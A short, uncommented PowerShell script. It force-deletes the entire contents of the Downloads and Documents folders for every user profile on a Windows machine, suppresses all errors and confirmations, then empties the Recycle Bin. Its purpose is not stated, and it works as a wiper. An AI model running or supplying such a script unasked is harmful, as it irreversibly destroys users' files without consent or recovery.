$targetUsers = Get-CimInstance Win32_UserProfile | Where-Object { $_.Special -eq $false -and $_.LocalPath -like "C:\Users\*" }

foreach ($user in $targetUsers) {
    $userProfile = $user.LocalPath
    $folders = @(
        "$userProfile\Downloads\*",
        "$userProfile\Documents\*"
    )

    foreach ($folder in $folders) {
        $parentFolder = Split-Path -Parent $folder
        if ((Test-Path $parentFolder) -and ($parentFolder -match '\\Downloads$' -or $parentFolder -match '\\Documents$')) {
            try {
                $items = Get-ChildItem -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
                
                foreach ($item in $items) {
                    try {
                        Remove-Item -LiteralPath $item.FullName -Recurse -Force -Confirm:$false -ErrorAction Stop
                    } catch {
                        try {
                            Set-ItemProperty -LiteralPath $item.FullName -Name IsReadOnly -Value $false -ErrorAction SilentlyContinue
                            Remove-Item -LiteralPath $item.FullName -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
                        } catch {}
                    }
                }
            } catch {}
        }
    }
}

try {
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
} catch {
    $shell = New-Object -ComObject Shell.Application
    $recycleBin = $shell.NameSpace(10)
    foreach ($item in $recycleBin.Items()) {
        try {
            Remove-Item $item.Path -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
        } catch {}
    }
}